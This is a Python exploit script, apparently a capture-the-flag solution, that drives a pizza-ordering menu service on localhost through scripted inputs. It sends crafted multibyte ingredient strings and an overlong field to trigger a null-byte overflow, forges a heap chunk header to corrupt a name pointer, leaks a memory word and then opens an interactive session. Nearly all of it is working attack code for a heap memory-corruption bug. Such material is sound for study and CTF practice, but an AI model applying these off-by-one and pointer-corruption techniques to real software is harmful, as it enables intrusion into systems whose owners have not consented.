from pwnlib import *

# make setup user, make two pizzas
def make_setup_user():
	s.ru("t\nChoice: ")
	s.send("N\n")

	s.ru("our name? ")
	s.send("setup\n")

	s.ru("e\nChoice: ")
	s.send("O\n")

	s.ru("y pizzas? ")
	s.send("2\n")

	s.ru("redients? ")
	s.send("2\n")

	s.ru("dient #1: ")
	s.send("aaaaaaaaa\n")

	s.ru("dient #2: ")
	s.send("bbbbbbbbbb\n")

	s.ru("redients? ")
	s.send("2\n")

	s.ru("dient #1: ")
	s.send("ccccccccc\n")

	s.ru("dient #2: ")
	s.send("ddddddddd\n")

	s.ru("e\nChoice: ")
	s.send("L\n")


def make_corrupt_user():
	s.ru("t\nChoice: ")
	s.send("N\n")

	s.ru("our name? ")
	s.send("corrupt\n")

	s.ru("e\nChoice: ")
	s.send("L\n")

def cook_setup_pizzas():
	s.ru("t\nChoice: ")
	s.send("L\n")

	s.ru("our name? ")
	s.send("setup\n")

	s.ru("e\nChoice: ")
	s.send("C\n")

	s.ru(" explain: ")
	s.send("declare\n")

	s.ru("e\nChoice: ")
	s.send("L\n")

	s.ru("t\nChoice: ")

def do_corrupt(payload):

	# log in to corrupt
	s.send("L\n")

	s.ru("our name? ")
	s.send("corrupt\n")


	# do the corruption

	s.ru("e\nChoice: ")
	s.send("O\n")

	s.ru("y pizzas? ")
	s.send("1\n")

	s.ru("redients? ")
	s.send("2\n")

	s.ru("dient #1: ")
	s.send("\xe0\xf0\x9f\n")

	s.ru("dient #2: ")
	s.send("\x8d\x8d\n")

	s.ru("e\nChoice: ")
	s.send("C\n")

	s.ru(" explain: ")

	SIZE = 0x20
	s.send("A"*(SIZE - 1) + "\n")

	s.ru(".\nChoice: ")
	s.send("P\n")

	s.ru("yourself: ")
	s.send(payload + "\n")

	s.ru("t\nChoice: ")


def leak():
	s.send("W\n")

	s.ru("your friend ")
	leaked = uq(s.ru(" ordered a pizza with").ljust(8, "\x00"))
	s.ru("t\nChoice: ")
	return leaked



######################################################


s = Socket(("localhost", 1710))


make_setup_user()
make_corrupt_user()
cook_setup_pizzas()


# the terminating null byte will corrupt the lower byte of the name pointer,
# so that the pointer now points to the beginning of the customer struct,
# where the name pointer itself resides
payload  = "A"*32
payload += pq(0)
payload += pq(0x51)

do_corrupt(payload)

leaked = leak()

print("Leaked a word: 0x%x" % leaked)


s.interact()
